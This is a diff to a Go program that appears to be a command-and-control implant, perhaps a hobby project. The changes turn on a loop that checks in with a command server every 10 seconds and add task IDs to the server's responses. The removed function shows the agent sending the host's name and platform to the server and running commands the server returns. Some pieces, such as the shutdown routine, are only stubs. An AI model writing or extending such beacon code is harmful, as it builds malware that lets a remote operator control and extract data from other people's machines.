@@ -5,6 +5,7 @@ import (
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
+	"time"
 
 	// "io/ioutil"
 	b64 "encoding/base64"
@@ -36,8 +37,9 @@ type CheckIn struct {
 }
 
 type CheckIn_response struct {
-	Task string `json:"task"`
-	Arg  string `json:"arg"`
+	TaskID string `json:"taskID"`
+	Task   string `json:"task"`
+	Arg    string `json:"arg"`
 }
 
 type command struct {
@@ -118,12 +120,12 @@ func main() {
 	// // main()
 
 	// Checks in every 10 seconds.
-	// for {
-	// 	time.Sleep(10 * time.Second)
-	// 	checkIn()
-	// }
+	for {
+		time.Sleep(10 * time.Second)
+		checkIn()
+	}
 
-	checkIn()
+	// checkIn()
 
 }
 
@@ -171,6 +173,7 @@ func checkIn() {
 	post := &CheckIn_response{}
 	derr := json.NewDecoder(res.Body).Decode(post)
 	if derr != nil {
+		fmt.Println("Error decoding the JSON")
 		panic(derr)
 	}
 
@@ -198,61 +201,6 @@ func shutdown() {
 	fmt.Println("Beep Boop. The computer should now shut down")
 
 	/// This is where the code to shutdown the PC will go
-}
-
-func old_checkIn() {
-
-	// Getting the info
-	hostname, _ := os.Hostname()
-	platform := runtime.GOOS
-
-	data := map[string]string{"ID": NodeID, "Hostname": hostname, "Platform": platform}
-
-	json_data, err := json.Marshal(data)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	r, err := http.NewRequest("POST", command_server+"/old-checkin", bytes.NewBuffer(json_data))
-	if err != nil {
-		panic(err)
-	}
-
-	// Add the header to say that it's json
-	r.Header.Add("Content-Type", "application/json")
-
-	//Create a client to send the data and then send it
-	client := &http.Client{}
-	res, err := client.Do(r)
-	if err != nil {
-		panic(err)
-	}
-
-	//shrug
-	defer res.Body.Close()
-
-	fmt.Println(res.StatusCode)
-
-	fmt.Println("here")
-
-	// Parse the JSON response
-	post := &command{}
-	derr := json.NewDecoder(res.Body).Decode(post)
-	if derr != nil {
-		panic(derr)
-	}
-
-	fmt.Println("And here")
-	// Output the JSON response
-	fmt.Println("ID: ", post.ID)
-	fmt.Println("Command: ", post.Command)
-	fmt.Println("Details: ", post.Details)
-
-	// If the command is run, then the the command
-	if post.Command == "run" {
-		runCommand(post.Details)
-	}
-
 }
 
 func getFIle() {
